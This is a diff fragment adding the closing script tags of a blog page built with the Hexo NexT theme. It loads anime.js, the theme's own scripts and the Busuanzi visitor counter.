+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
